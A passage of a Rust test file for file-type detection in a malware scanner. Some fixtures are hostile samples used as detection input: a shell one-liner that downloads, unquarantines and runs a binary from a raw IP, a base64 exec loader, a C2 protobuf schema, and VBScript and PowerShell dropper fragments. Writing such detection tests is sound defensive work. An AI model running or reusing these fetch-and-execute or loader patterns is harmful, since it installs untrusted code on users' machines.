        // 16 bytes is enough for the magic + version slot tested below.
        let data = b"\x00\x05\x16\x07\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
        let det = detect(Path::new("._foo.php"), data).unwrap();
        assert_eq!(det.file_type, FileType::Unknown);
        // Magic detection must win over the `.php` extension fallback —
        // otherwise the body gets analyzed as PHP and entropy traits fire.
        assert!(
            !det.file_type.is_program(),
            "AppleDouble bodies must be skipped by is_program() so cleave doesn't \
             analyze them; otherwise benign tarballs with macOS resource forks \
             score as suspicious"
        );
    }

    #[test]
    fn appledouble_magic_overrides_php_extension() {
        let data = b"\x00\x05\x16\x07\x00\x02\x00\x00rest_is_binary_metadata";
        let det = detect(Path::new("wundii-flowcrafter/._index.php"), data).unwrap();
        assert_eq!(det.file_type, FileType::Unknown);
        assert_eq!(det.source, DetectionSource::Magic);
    }

    #[test]
    fn null_byte_without_appledouble_magic_does_not_match() {
        // Negative: a file that starts with 0x00 but isn't AppleDouble
        // (e.g. raw padded data) must not be misclassified as Unknown via
        // this path. Falls through to extension/heuristic detection.
        let data = b"\x00\x00\x00\x00more null bytes here";
        let det = detect(Path::new("padding.dat"), data);
        // .dat extension maps to Data; the 0x00 arm must not have intercepted.
        assert!(
            det.is_none() || det.unwrap().file_type != FileType::Unknown,
            "unrelated 0x00-leading bytes must not be claimed as AppleDouble"
        );
    }

    // ── Java ─────────────────────────────────────────────────────────

    #[test]
    fn java_class_magic() {
        assert_detect(
            "Main.class",
            &[0xCA, 0xFE, 0xBA, 0xBE, 0, 0, 0, 52],
            FileType::JavaClass,
        );
    }

    #[test]
    fn java_class_by_ext() {
        assert_ext("Foo.class", FileType::JavaClass);
    }

    #[test]
    fn java_source_by_ext() {
        assert_ext("Foo.java", FileType::Java);
    }

    #[test]
    fn jar_pk_magic() {
        assert_detect("lib.jar", b"PK\x03\x04jar content", FileType::Jar);
    }

    #[test]
    fn jar_by_ext() {
        assert_detect("lib.war", b"PK\x03\x04war content", FileType::Jar);
    }

    #[test]
    fn xpi_by_ext_routes_to_xpi_not_zip() {
        // ZIP magic + .xpi extension → FileType::Xpi (distinct from generic Zip).
        assert_detect("addon.xpi", b"PK\x03\x04xpi content", FileType::Xpi);
    }

    #[test]
    fn xpi_classified_as_archive() {
        assert!(FileType::Xpi.is_archive());
    }

    #[test]
    fn whl_by_ext_routes_to_whl_not_zip() {
        assert_detect(
            "pkg-1.0-py3-none-any.whl",
            b"PK\x03\x04wheel content",
            FileType::Whl,
        );
    }

    #[test]
    fn whl_classified_as_archive() {
        assert!(FileType::Whl.is_archive());
    }

    #[test]
    fn opc_package_archives_do_not_route_to_ooxml() {
        let data = b"PK\x03\x04[Content_Types].xml";
        for name in [
            "app.msix",
            "app.appx",
            "bundle.msixbundle",
            "bundle.appxbundle",
            "comic.cbz",
        ] {
            assert_detect(name, data, FileType::Zip);
        }
    }

    // ── Python ───────────────────────────────────────────────────────

    #[test]
    fn python_by_ext() {
        assert_ext("script.py", FileType::Python);
    }

    #[test]
    fn python_by_shebang() {
        assert_detect(
            "mystery",
            b"#!/usr/bin/env python3\nimport sys\n",
            FileType::Python,
        );
    }

    #[test]
    fn python_by_import_heuristic_without_filename() {
        assert_detect(
            "mystery",
            b"import os, subprocess, tempfile, base64; exec(base64.b64decode('cHJpbnQoMSk='))\n",
            FileType::Python,
        );
    }

    #[test]
    fn python_bytecode_magic() {
        assert_detect(
            "mod.pyc",
            &[0x42, 0x0D, 0x0D, 0x0A, 0, 0, 0, 0],
            FileType::PythonBytecode,
        );
    }

    #[test]
    fn python_bytecode_by_ext() {
        assert_ext("mod.pyc", FileType::PythonBytecode);
    }

    // ── JavaScript / TypeScript ──────────────────────────────────────

    #[test]
    fn javascript_by_ext() {
        assert_ext("app.js", FileType::JavaScript);
        assert_ext("app.mjs", FileType::JavaScript);
        assert_ext("app.cjs", FileType::JavaScript);
        assert_ext("app.jsx", FileType::JavaScript);
    }

    #[test]
    fn javascript_by_shebang() {
        assert_detect(
            "tool",
            b"#!/usr/bin/env node\nconsole.log('hi');\n",
            FileType::JavaScript,
        );
    }

    #[test]
    fn typescript_by_ext() {
        assert_ext("app.ts", FileType::TypeScript);
        assert_ext("app.tsx", FileType::TypeScript);
    }

    // ── Shell ────────────────────────────────────────────────────────

    #[test]
    fn shell_by_ext() {
        assert_ext("run.sh", FileType::Shell);
        assert_ext("run.bash", FileType::Shell);
        assert_ext("run.zsh", FileType::Shell);
    }

    #[test]
    fn shell_by_shebang() {
        assert_detect("mystery", b"#!/bin/bash\necho hello\n", FileType::Shell);
        assert_detect("mystery", b"#!/bin/sh\necho hello\n", FileType::Shell);
        assert_detect(
            "mystery",
            b"#!/usr/bin/env zsh\necho hello\n",
            FileType::Shell,
        );
    }

    #[test]
    fn script_extension_overrides_shell_shebang_juke() {
        // .py with a bash shebang: the shebang is a static-analysis-evasion
        // juke, the extension is what the user/loader treats the file as.
        // Trust the extension; flag the mismatch.
        let det = detect(Path::new("script.py"), b"#!/bin/bash\necho hello\n").unwrap();
        assert_eq!(det.file_type, FileType::Python);
        assert!(det.extension_mismatch());
        assert_eq!(det.extension_type(), Some(FileType::Shell));
    }

    #[test]
    fn js_extension_overrides_bash_shebang_juke() {
        // npm xmlrpc / xmrdropper pattern.
        let det = detect(
            Path::new("validator.js"),
            b"#!/bin/bash\nconst fs = require('fs');\n",
        )
        .unwrap();
        assert_eq!(det.file_type, FileType::JavaScript);
        assert!(det.extension_mismatch());
        assert_eq!(det.extension_type(), Some(FileType::Shell));
    }

    #[test]
    fn protobuf_schema_extension_prevents_kotlin_heuristic() {
        let data = br#"syntax = "proto3";

package c2;

service C2Service {
  rpc BeaconStream(stream BeaconMessage) returns (stream CommandMessage);
  rpc SendCommand(SendCommandRequest) returns (SendCommandResponse);
}

message CommandMessage {
  string command_id = 1;
  string command = 2;
  repeated string args = 3;
}
"#;
        let det = detect(Path::new("c2.proto"), data).unwrap();
        assert_eq!(det.file_type, FileType::Text);
        assert!(!det.extension_mismatch());
    }

    #[test]
    fn shell_extension_with_shell_shebang_no_juke() {
        // .sh with bash shebang: not a juke, no override.
        let det = detect(Path::new("script.sh"), b"#!/bin/bash\necho hello\n").unwrap();
        assert_eq!(det.file_type, FileType::Shell);
        assert!(!det.extension_mismatch());
    }

    #[test]
    fn shell_one_liner_without_shebang_or_ext() {
        assert_detect(
            "Sifuvuziw",
            b"cd $TMPDIR && curl -O http://144.31.236.51/Dynamic && xattr -c ./Dynamic && chmod +x ./Dynamic && ./Dynamic\n",
            FileType::Shell,
        );
    }

    #[test]
    fn shell_empty_falls_back_to_ext() {
        let det = detect(Path::new("run.sh"), b"").unwrap();
        assert_eq!(det.file_type, FileType::Shell);
        assert_eq!(det.source, DetectionSource::Extension);
    }

    // ── Batch ────────────────────────────────────────────────────────

    #[test]
    fn batch_by_ext() {
        assert_ext("run.bat", FileType::Batch);
        assert_ext("run.cmd", FileType::Batch);
    }

    // ── JCL ──────────────────────────────────────────────────────────

    #[test]
    fn jcl_by_ext() {
        assert_ext("run.jcl", FileType::Jcl);
    }

    // ── VBScript ─────────────────────────────────────────────────────

    #[test]
    fn vbs_by_ext() {
        assert_ext("script.vbs", FileType::Vbs);
        assert_ext("script.vbe", FileType::Vbs);
        assert_ext("script.wsf", FileType::Vbs);
    }

    // ── Go / Rust / Swift / Objective-C / Zig / Elixir ──────────────

    #[test]
    fn go_by_ext() {
        assert_ext("main.go", FileType::Go);
    }

    #[test]
    fn rust_by_ext() {
        assert_ext("lib.rs", FileType::Rust);
    }

    #[test]
    fn swift_by_ext() {
        assert_ext("app.swift", FileType::Swift);
    }

    #[test]
    fn objc_by_ext() {
        assert_ext("view.m", FileType::ObjectiveC);
        assert_ext("view.mm", FileType::ObjectiveC);
    }

    #[test]
    fn zig_by_ext() {
        assert_ext("main.zig", FileType::Zig);
    }

    #[test]
    fn elixir_by_ext() {
        assert_ext("app.ex", FileType::Elixir);
        assert_ext("test.exs", FileType::Elixir);
    }

    // ── Ruby ─────────────────────────────────────────────────────────

    #[test]
    fn ruby_by_ext() {
        assert_ext("app.rb", FileType::Ruby);
    }

    #[test]
    fn ruby_by_shebang() {
        assert_detect("tool", b"#!/usr/bin/env ruby\nputs 'hi'\n", FileType::Ruby);
    }

    // ── PHP ──────────────────────────────────────────────────────────

    #[test]
    fn php_by_ext() {
        assert_ext("page.php", FileType::Php);
    }

    #[test]
    fn php_by_opening_tag() {
        assert_detect("page", b"<?php\necho 'hello';\n", FileType::Php);
    }

    #[test]
    fn php_by_shebang() {
        assert_detect(
            "tool",
            b"#!/usr/bin/env php\n<?php echo 1;\n",
            FileType::Php,
        );
    }

    // ── Perl ─────────────────────────────────────────────────────────

    #[test]
    fn perl_by_ext() {
        assert_ext("script.pl", FileType::Perl);
        assert_ext("module.pm", FileType::Perl);
    }

    #[test]
    fn perl_by_shebang() {
        assert_detect("tool", b"#!/usr/bin/perl\nuse strict;\n", FileType::Perl);
    }

    // ── Lua ──────────────────────────────────────────────────────────

    #[test]
    fn lua_by_ext() {
        assert_ext("script.lua", FileType::Lua);
    }

    #[test]
    fn lua_by_shebang() {
        assert_detect("tool", b"#!/usr/bin/env lua\nprint('hi')\n", FileType::Lua);
    }

    // ── C# ───────────────────────────────────────────────────────────

    #[test]
    fn csharp_by_ext() {
        assert_ext("App.cs", FileType::CSharp);
    }

    // ── PowerShell ───────────────────────────────────────────────────

    #[test]
    fn powershell_by_ext() {
        assert_ext("script.ps1", FileType::PowerShell);
        assert_ext("module.psm1", FileType::PowerShell);
    }

    // ── Groovy / Scala ───────────────────────────────────────────────

    #[test]
    fn groovy_by_ext() {
        assert_ext("build.groovy", FileType::Groovy);
        assert_ext("build.gradle", FileType::Groovy);
    }

    #[test]
    fn scala_by_ext() {
        assert_ext("App.scala", FileType::Scala);
    }

    // ── C/C++ ────────────────────────────────────────────────────────

    #[test]
    fn c_by_ext() {
        assert_ext("main.c", FileType::C);
        assert_ext("main.h", FileType::C);
        assert_ext("main.cpp", FileType::C);
        assert_ext("main.hpp", FileType::C);
    }

    // ── Manifests ────────────────────────────────────────────────────

    #[test]
    fn package_json() {
        let det = detect(Path::new("package.json"), b"{}").unwrap();
        assert_eq!(det.file_type, FileType::PackageJson);
        assert_eq!(det.source, DetectionSource::Filename);
    }

    #[test]
    fn package_lock_json() {
        let det = detect(Path::new("package-lock.json"), b"{}").unwrap();
        assert_eq!(det.file_type, FileType::PackageLockJson);
        assert_eq!(det.source, DetectionSource::Filename);
    }

    #[test]
    fn composer_json() {
        assert_ext("composer.json", FileType::ComposerJson);
    }

    #[test]
    fn cargo_toml() {
        assert_ext("Cargo.toml", FileType::CargoToml);
    }

    #[test]
    fn pyproject_toml() {
        assert_ext("pyproject.toml", FileType::PyProjectToml);
    }

    #[test]
    fn vsix_manifest() {
        assert_detect("extension.vsixmanifest", b"<xml/>", FileType::VsixManifest);
    }

    #[test]
    fn chrome_manifest() {
        let data = br#"{"manifest_version": 3, "permissions": ["storage"]}"#;
        assert_detect("manifest.json", data, FileType::ChromeManifest);
    }

    #[test]
    fn github_actions_workflow() {
        let det = detect(Path::new(".github/workflows/ci.yml"), b"name: CI\n").unwrap();
        assert_eq!(det.file_type, FileType::GithubActions);
        assert_eq!(det.source, DetectionSource::Filename);
    }

    #[test]
    fn github_actions_workflow_by_content() {
        let data = b"name: CI\n\non: [push]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n";
        let det = detect(Path::new("ci.yml"), data).unwrap();
        assert_eq!(det.file_type, FileType::GithubActions);
        assert_eq!(det.source, DetectionSource::Heuristic);
        assert!(!det.extension_mismatch());
    }

    #[test]
    fn github_actions_composite() {
        assert_detect("action.yml", b"name: My Action\n", FileType::GithubActions);
    }

    #[test]
    fn systemd_service() {
        assert_detect(
            "evil.service",
            b"[Unit]\nDescription=Evil\n[Service]\nExecStart=/bin/true\n",
            FileType::SystemdService,
        );
    }

    #[test]
    fn systemd_service_drop_in() {
        assert_ext(
            "/etc/systemd/system/ssh.service.d/override.conf",
            FileType::SystemdService,
        );
    }

    #[test]
    fn pkg_info() {
        assert_detect("PKG-INFO", b"Metadata-Version: 2.1\n", FileType::PkgInfo);
        assert_detect("METADATA", b"Metadata-Version: 2.1\n", FileType::PkgInfo);
    }

    #[test]
    fn arch_package_metadata_files_are_text() {
        assert_detect(".PKGINFO", b"pkgname = wasm-pkg-tools\n", FileType::Text);
        assert_detect(".BUILDINFO", b"format = 2\n", FileType::Text);
        assert_detect(".MTREE", b"#mtree\n", FileType::Text);
    }

    // ── Archives ─────────────────────────────────────────────────────

    #[test]
    fn zip_archive() {
        assert_detect("data.zip", b"PK\x03\x04content", FileType::Zip);
    }

    #[test]
    fn rar_archive() {
        assert_detect("data.rar", b"Rar!\x1a\x07\x01\x00", FileType::Rar);
    }

    #[test]
    fn gzip_archive() {
        assert_detect("data.gz", &[0x1f, 0x8b, 0x08, 0x00], FileType::Gz);
    }

    #[test]
    fn xz_archive() {
        assert_detect("data.xz", b"\xfd7zXZ\x00", FileType::Xz);
    }

    #[test]
    fn bzip2_archive() {
        assert_detect("data.bz2", b"BZh91AY&SY", FileType::Bz2);
    }

    #[test]
    fn dmg_udif_archive() {
        let mut data = vec![0u8; 2048];
        data[63..66].copy_from_slice(b"BZh");
        let trailer = data.len() - 512;
        data[trailer..trailer + 4].copy_from_slice(b"koly");
        data[trailer + 4..trailer + 8].copy_from_slice(&4u32.to_be_bytes());
        data[trailer + 8..trailer + 12].copy_from_slice(&512u32.to_be_bytes());

        assert_detect("data.dmg", &data, FileType::Dmg);
    }

    #[test]
    fn sevenz_archive() {
        assert_detect("data.7z", b"7z\xBC\xAF\x27\x1C\x00", FileType::SevenZ);
    }

    #[test]
    fn zstd_archive() {
        assert_detect("data.zst", &[0x28, 0xB5, 0x2F, 0xFD, 0, 0], FileType::Zst);
    }

    #[test]
    fn freebsd_pkg_zstd_is_not_extension_mismatch() {
        let data = zstd::encode_all(&b"+COMPACT_MANIFEST\0payload"[..], 3).unwrap();
        // FreeBSD `.pkg` (zstd tar) now carries its own ecosystem type; the
        // `.pkg`→macOS extension default is a benign refinement, suppressed at
        // the FileId level where consumers read it.
        let id = FileId::from_path_and_bytes(Path::new("BerkeleyGW-4.0_2.pkg"), &data);
        assert_eq!(id.file_type(), FileType::PkgFreebsd);
        assert!(!id.extension_mismatch());
    }

    #[test]
    fn tar_gz_by_ext() {
        assert_ext("data.tar.gz", FileType::TarGz);
        assert_ext("data.tgz", FileType::TarGz);
    }

    #[test]
    fn deb_by_ext() {
        assert_ext("package.deb", FileType::Deb);
    }

    #[test]
    fn gem_by_ext() {
        // A gem is an uncompressed tar with no offset-0 magic, so it resolves
        // through the extension fallback to its own type (not generic Tar).
        assert_ext("rails-7.0.4.gem", FileType::Gem);
    }

    #[test]
    fn apk_split_is_not_an_extension_mismatch() {
        // Both `.apk` ecosystems are content-detected away from the extension's
        // zip default, but that disambiguation is benign — not an evasion flag.
        let android = FileId::from_path_and_bytes(Path::new("app.apk"), b"PK\x03\x04zip body");
        assert_eq!(android.file_type(), FileType::ApkAndroid);
        assert!(!android.extension_mismatch());

        let alpine = FileId::from_path_and_bytes(Path::new("musl.apk"), &[0x1f, 0x8b, 0x08, 0x00]);
        assert_eq!(alpine.file_type(), FileType::ApkAlpine);
        assert!(!alpine.extension_mismatch());
    }

    #[test]
    fn package_types_stay_in_archive_group() {
        // Fine-grained package identity must not leak out of the coarse
        // `archive` group that downstream consumers key on.
        for ft in [
            FileType::Gem,
            FileType::ApkAndroid,
            FileType::ApkAlpine,
            FileType::Npm,
            FileType::Crate,
            FileType::Conda,
            FileType::Egg,
            FileType::Nupkg,
            FileType::Ipa,
            FileType::Vsix,
            FileType::PkgMacos,
            FileType::Dmg,
            FileType::PkgFreebsd,
            FileType::PkgArch,
        ] {
            assert!(ft.is_archive(), "{ft:?} should be an archive");
            assert_eq!(file_group(ft), "archive", "{ft:?} group");
        }
    }

    #[test]
    fn rpm_by_ext() {
        assert_ext("package.rpm", FileType::Rpm);
    }

    #[test]
    fn is_archive_returns_true_for_archives() {
        assert!(FileType::Zip.is_archive());
        assert!(FileType::TarGz.is_archive());
        assert!(FileType::Rar.is_archive());
        assert!(FileType::SevenZ.is_archive());
        assert!(FileType::Deb.is_archive());
        assert!(FileType::Jar.is_archive());
        assert!(!FileType::Elf.is_archive());
        assert!(!FileType::Python.is_archive());
    }

    #[test]
    fn is_binary_returns_true_for_binaries() {
        assert!(FileType::Elf.is_binary());
        assert!(FileType::Pe.is_binary());
        assert!(FileType::MachO.is_binary());
        assert!(FileType::JavaClass.is_binary());
        assert!(!FileType::Zip.is_binary());
        assert!(!FileType::Python.is_binary());
    }

    #[test]
    fn is_structured_data_true_for_fully_parsed_manifests() {
        assert!(FileType::PackageJson.is_structured_data());
        assert!(FileType::CargoToml.is_structured_data());
        assert!(FileType::GithubActions.is_structured_data());
        assert!(FileType::Plist.is_structured_data());
        assert!(FileType::SrcInfo.is_structured_data());
        // Generic JSON is size-limited and may fall back to a text scan, so it
        // is deliberately *not* treated as fully-parsed structured data.
        assert!(!FileType::Json.is_structured_data());
        assert!(!FileType::Python.is_structured_data());
        assert!(!FileType::Elf.is_structured_data());
    }

    // ── Documents ────────────────────────────────────────────────────

    #[test]
    fn pdf_magic() {
        assert_detect("doc.pdf", b"%PDF-1.4 content", FileType::Pdf);
    }

    #[test]
    fn pdf_by_ext() {
        assert_ext("doc.pdf", FileType::Pdf);
    }

    #[test]
    fn rtf_magic() {
        assert_detect("doc.rtf", b"{\\rtf1\\ansi content", FileType::Rtf);
    }

    #[test]
    fn ole_doc_magic() {
        let mut data = vec![0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
        data.extend_from_slice(&[0; 100]);
        assert_detect("doc.doc", &data, FileType::OleDoc);
    }

    #[test]
    fn ole_by_ext() {
        assert_ext("file.doc", FileType::OleDoc);
        assert_ext("file.xls", FileType::OleDoc);
        assert_ext("file.ppt", FileType::OleDoc);
        assert_ext("file.msg", FileType::OleDoc);
    }

    #[test]
    fn ooxml_by_ext_magic() {
        assert_detect("report.docx", b"PK\x03\x04office", FileType::Ooxml);
        assert_detect("sheet.xlsx", b"PK\x03\x04office", FileType::Ooxml);
        assert_detect("slides.pptx", b"PK\x03\x04office", FileType::Ooxml);
    }

    #[test]
    fn ooxml_by_ext_only() {
        assert_ext("report.docx", FileType::Ooxml);
        assert_ext("report.docm", FileType::Ooxml);
    }

    // ── Apple formats ────────────────────────────────────────────────

    #[test]
    fn applescript_magic() {
        assert_detect("script.scpt", b"Fasd\x00\x00", FileType::AppleScript);
    }

    #[test]
    fn applescript_by_ext() {
        assert_ext("script.scpt", FileType::AppleScript);
        assert_ext("script.applescript", FileType::AppleScript);
    }

    #[test]
    fn plist_binary() {
        assert_detect("prefs", b"bplist00\x00\x00\x00", FileType::Plist);
    }

    #[test]
    fn plist_xml() {
        assert_detect(
            "Info.plist",
            b"<?xml version=\"1.0\"?>\n<!DOCTYPE plist>",
            FileType::Plist,
        );
    }

    #[test]
    fn plist_by_ext() {
        assert_ext("prefs.plist", FileType::Plist);
    }

    // ── Images ───────────────────────────────────────────────────────

    #[test]
    fn jpeg_magic() {
        assert_detect(
            "photo.jpg",
            &[0xFF, 0xD8, 0xFF, 0xE0, 0, 0x10],
            FileType::Jpeg,
        );
    }

    #[test]
    fn jpeg_by_ext() {
        assert_ext("photo.jpg", FileType::Jpeg);
        assert_ext("photo.jpeg", FileType::Jpeg);
    }

    #[test]
    fn png_magic() {
        assert_detect(
            "image.png",
            b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR",
            FileType::Png,
        );
    }

    #[test]
    fn png_by_ext() {
        assert_ext("image.png", FileType::Png);
    }

    // ── Other formats ────────────────────────────────────────────────

    #[test]
    fn lnk_magic() {
        let mut data = vec![
            0x4C, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
        ];
        data.extend_from_slice(&[0; 100]);
        assert_detect("shortcut.lnk", &data, FileType::Lnk);
    }

    #[test]
    fn lnk_by_ext() {
        assert_ext("shortcut.lnk", FileType::Lnk);
    }

    #[test]
    fn chm_magic() {
        // ITSF header: ITSF + version=3 + header_len + 1 + timestamp + lcid
        let mut data = b"ITSF".to_vec();
        data.extend_from_slice(&3u32.to_le_bytes()); // version
        data.extend_from_slice(&[0u8; 24]); // padding
        assert_detect("help.chm", &data, FileType::Chm);
    }

    #[test]
    fn chm_by_ext() {
        assert_ext("help.chm", FileType::Chm);
    }

    #[test]
    fn pickle_magic() {
        assert_detect("model.pkl", &[0x80, 0x04, 0x95, 0x00], FileType::Pickle);
    }

    #[test]
    fn pickle_by_ext() {
        assert_ext("model.pkl", FileType::Pickle);
        assert_ext("data.pickle", FileType::Pickle);
    }

    #[test]
    fn html_with_content() {
        assert_detect(
            "page.html",
            b"<!DOCTYPE html><html><body>hi</body></html>",
            FileType::Html,
        );
    }

    #[test]
    fn html_without_content_skipped() {
        // .html extension but no HTML tags → skip
        assert!(detect(Path::new("page.html"), b"just plain text").is_none());
    }

    #[test]
    fn extensionless_php_html_fragment_detects_as_php() {
        let data = br#"/**
** Filters for Special Mail Tags
**/

add_filter( 'wpcf7_special_mail_tags', 'wpcf7_special_mail_tag', 10, 3 );

function wpcf7_special_mail_tag( $output, $name, $html ) {
    if ( '_remote_ip' == $name )
        $output = preg_replace( '/[^0-9a-f.:, ]/', '', $_SERVER['REMOTE_ADDR'] );
    elseif ( '_user_agent' == $name )
        $output = substr( $_SERVER['HTTP_USER_AGENT'], 0, 254 );
}
?>
<!DOCTYPE html><html><head><script>var x = 1;</script></head></html>
"#;
        let det = detect(Path::new("wordpress-cache-fragment"), data)
            .expect("expected PHP heuristic detection");
        assert_eq!(det.file_type, FileType::Php);
        assert_eq!(det.source, DetectionSource::Heuristic);
    }

    #[test]
    fn markdown_by_ext() {
        assert_ext("readme.md", FileType::Markdown);
        assert_ext("notes.markdown", FileType::Markdown);
    }

    #[test]
    fn makefile_path_only_detection() {
        assert_detect("Makefile", b"all:\n\techo hi\n", FileType::Makefile);
        assert_detect("Makefile.debug", b"all:\n\techo hi\n", FileType::Makefile);
        assert_detect("rules.mk", b"all:\n\techo hi\n", FileType::Makefile);
        assert!(detect(Path::new("buildfile"), b"all:\n\techo hi\n").is_none());
    }

    // ── Skip / non-match ─────────────────────────────────────────────

    #[test]
    fn unknown_binary_returns_none() {
        // `.bin` now classifies as `Data` (see ext.rs), so use an
        // unregistered extension + unrecognised magic to exercise the
        // "truly unknown" path.
        let got = detect(Path::new("data.blob"), b"\x00\x00\x00\x00");
        assert!(
            got.is_none(),
            "expected None for unknown content, got {got:?}"
        );
    }

    #[test]
    fn yaml_not_misclassified() {
        assert!(detect(Path::new("config.yaml"), b"name: test\non: push\n").is_none());
    }

    #[test]
    fn json_data_detects_as_generic_json() {
        let det = detect(Path::new("data.json"), b"{\"key\": \"value\"}").unwrap();
        assert_eq!(det.file_type, FileType::Json);
        assert!(det.file_type.is_program());
    }

    #[test]
    fn txt_detects_as_text() {
        assert_detect("notes.txt", b"some text here", FileType::Text);
    }

    #[test]
    fn asar_detects_as_archive() {
        assert_detect(
            "app.asar",
            b"\x04\x00\x00\x00\x20\x00\x00\x00\x1c\x00\x00\x00\x18\x00\x00\x00{\"files\":{}}",
            FileType::Asar,
        );
        assert!(FileType::Asar.is_archive());
    }

    // ── API: detect_content / detect_path ────────────────────────────

    #[test]
    fn detect_content_only() {
        let det = detect_content(b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR").unwrap();
        assert_eq!(det.file_type, FileType::Png);
    }

    #[test]
    fn detect_path_only() {
        let det = detect_path(Path::new("app.js")).unwrap();
        assert_eq!(det.file_type, FileType::JavaScript);
    }

    // ── Filename-detected types inside temp directories ──────────────

    /// Filename-detected types (package.json, Cargo.toml, etc.) must be
    /// recognized when the file sits inside a temp directory, which is how
    /// the HTTP upload handlers preserve the original name.
    #[test]
    fn license_in_temp_dir_detected_as_text() {
        let data = include_bytes!("testdata/LICENSE");
        let det = detect(Path::new("/tmp/fn-list/LICENSE"), data).unwrap();
        assert_eq!(det.file_type, FileType::Text);
        assert_eq!(det.source, DetectionSource::Filename);
    }

    // ── Content-first detection beats extension-only fallback ────────

    /// Real-world polyglot: a `.zip` file whose first KB is a VBScript
    /// payload (CHM/EOCD-comment dropper). Trusting the `.zip` extension
    /// would route to the ZIP analyzer and fail outright; the heuristic
    /// must take precedence so the script content gets analyzed and the
    /// extension/content mismatch surfaces.
    #[test]
    fn polyglot_zip_extension_with_vbscript_body_detected_as_vbs() {
        let body = b"On Error Resume Next\r\n\
            Dim S1, FSO, Shell\r\n\
            Set FSO = CreateObject(\"Scripting.FileSystemObject\")\r\n\
            Set Shell = CreateObject(\"WScript.Shell\")\r\n\
            Set S1 = CreateObject(\"ADODB.Stream\")\r\n";
        let det = detect(Path::new("Wallets.zip"), body).unwrap();
        assert_eq!(det.file_type, FileType::Vbs);
        assert_eq!(det.source, DetectionSource::Heuristic);
        // The mismatch must be visible to callers (cleave reports it as a
        // suspicious "extension says X but content is Y" finding).
        assert!(det.extension_mismatch());
        assert_eq!(det.extension_type(), Some(FileType::Zip));
    }

    /// Same idea, but with PowerShell content under a `.zip` extension —
    /// covers the `.NET reflection AMSI bypass` shape we sometimes see
    /// dropped under decoy archive names.
    #[test]
    fn polyglot_zip_extension_with_powershell_body_detected_as_ps1() {
        let body = b"$ErrorActionPreference = 'SilentlyContinue'\n\
            Invoke-Expression $payload\n\
            [Reflection.Assembly]::Load($bytes)\n";
        let det = detect(Path::new("update.zip"), body).unwrap();
        assert_eq!(det.file_type, FileType::PowerShell);
        assert!(det.extension_mismatch());
    }

    /// Negative: a real ZIP (PK magic) under `.zip` must still resolve
    /// via magic detection, *not* via heuristics — even if the archive
    /// happens to embed text that resembles script keywords later in the
    /// file. Heuristics scan only the first few KB so PK at offset 0
    /// short-circuits cleanly.
    #[test]
    fn real_zip_still_detected_by_magic_not_heuristics() {
        let mut data = b"PK\x03\x04".to_vec();
        // Append some script-like text that *would* trigger heuristics if
        // we ever reached them.
        data.extend_from_slice(b"WScript.Shell CreateObject Option Explicit");
        let det = detect(Path::new("real.zip"), &data).unwrap();
        assert_eq!(det.file_type, FileType::Zip);
        assert_eq!(det.source, DetectionSource::Magic);
        assert!(!det.extension_mismatch());
    }

    #[test]
    fn source_extension_beats_weak_language_heuristics() {
        let go = b"package main\n\nimport \"log/slog\"\n\nfunc main() { slog.Info(\"ok\") }\n";
        let det = detect(Path::new("main.go"), go).unwrap();
        assert_eq!(det.file_type, FileType::Go);
        assert_eq!(det.source, DetectionSource::Extension);
        assert!(!det.extension_mismatch());

        let js = b"const fs = require('fs');\nvar x = 1;\nmodule.exports = x;\n";
        let det = detect(Path::new("index.js"), js).unwrap();
        assert_eq!(det.file_type, FileType::JavaScript);
        assert_eq!(det.source, DetectionSource::Extension);
        assert!(!det.extension_mismatch());
    }

    #[test]
    fn unsupported_ocaml_extensions_skip_weak_language_heuristics() {
        let ml = b"open Stdune\nmodule Scheduler = Fiber.Scheduler\nlet main () = Fiber.run Scheduler.go\n";
        let det = detect(Path::new("scheduler_bench.ml"), ml).unwrap();
        assert_eq!(det.file_type, FileType::Text);
        assert_eq!(det.source, DetectionSource::Extension);
        assert!(!det.extension_mismatch());

        let mli = b"type t\nval create : unit -> t\nval run : t -> unit\n";
        let det = detect(Path::new("duneboot.mli"), mli).unwrap();
        assert_eq!(det.file_type, FileType::Text);
        assert_eq!(det.source, DetectionSource::Extension);
        assert!(!det.extension_mismatch());
    }

    /// Negative: a `.cargo.toml` file with text content stays in its
    /// declared role via the extension/filename path. Data formats are
    /// listed in `ext::is_data_format` precisely so heuristics doesn't
    /// second-guess them — even if the body's first few KB include
    /// keyword sequences that look script-like.
    #[test]
    fn data_format_extension_skips_heuristics() {
        // YAML body deliberately seeded with `===` and `WScript.` —
        // both are heuristic triggers — to confirm `.yaml` short-
        // circuits past the heuristic stage.
        let body = b"name: example\n=== heading ===\n# WScript.Shell mention\nfield: value\n";
        let det = detect(Path::new("config.yaml"), body);
        // `.yaml` isn't a recognised type in fileid's enum (treated as a
        // data format that the analyzer pipeline handles elsewhere), so
        // the function returning `None` here is correct — the important
        // assertion is that we did NOT misclassify this as JavaScript /
        // VBScript via heuristics. If a regression makes heuristics fire,
        // `det` would be `Some(JavaScript)` or similar instead of `None`.
        if let Some(d) = det {
            assert!(
                !matches!(
                    d.file_type,
                    FileType::JavaScript | FileType::Vbs | FileType::PowerShell
                ),
                "yaml body misclassified as {:?}",
                d.file_type
            );
        }
    }

    #[test]
    fn package_json_in_temp_dir() {
        let det = detect(Path::new("/tmp/cleave-abc123/package.json"), b"{}").unwrap();
        assert_eq!(det.file_type, FileType::PackageJson);
    }

    #[test]
    fn package_lock_json_in_temp_dir() {
        let det = detect(Path::new("/tmp/cleave-abc123/package-lock.json"), b"{}").unwrap();
        assert_eq!(det.file_type, FileType::PackageLockJson);
    }

    #[test]
    fn cargo_toml_in_temp_dir() {
        let det = detect(Path::new("/tmp/cleave-abc123/Cargo.toml"), b"[package]").unwrap();
        assert_eq!(det.file_type, FileType::CargoToml);
    }

    #[test]
    fn composer_json_in_temp_dir() {
        let det = detect(Path::new("/tmp/cleave-abc123/composer.json"), b"{}").unwrap();
        assert_eq!(det.file_type, FileType::ComposerJson);
    }

    /// A temp file with a mangled name (old behavior: suffix-based) must NOT
    /// match filename detection — this documents why the temp-directory
    /// approach is necessary.
    #[test]
    fn mangled_temp_name_does_not_detect_package_json() {
